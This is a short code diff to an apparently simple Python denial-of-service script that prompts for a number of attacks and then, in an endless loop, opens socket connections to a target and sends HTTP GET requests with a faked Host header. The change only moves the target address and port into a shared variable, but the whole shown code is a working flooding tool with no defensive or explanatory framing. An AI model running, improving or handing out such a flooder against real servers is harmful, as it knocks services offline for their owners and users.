@@ -8,14 +8,15 @@ attack_count = int(input("Amount of attacks: "))
 
 get = "GET /" + target + " HTTP/1.1\r\n"
 host = "Host: " + fake_ip + "\r\n\r\n"
+target_port = (target, port)
 
 def attack(count):
     while True:
         try:
             s = socket(AF_INET, SOCK_STREAM)
-            s.connect((target, port))
-            s.sendto((get).encode('ascii'),(target, port))
-            s.sendto((host).encode('ascii'),(target, port))
+            s.connect(target_port)
+            s.sendto((get).encode('ascii'),target_port)
+            s.sendto((host).encode('ascii'),target_port)
             s.close()
             print("Successfull: " + count)
         except ConnectionRefusedError:
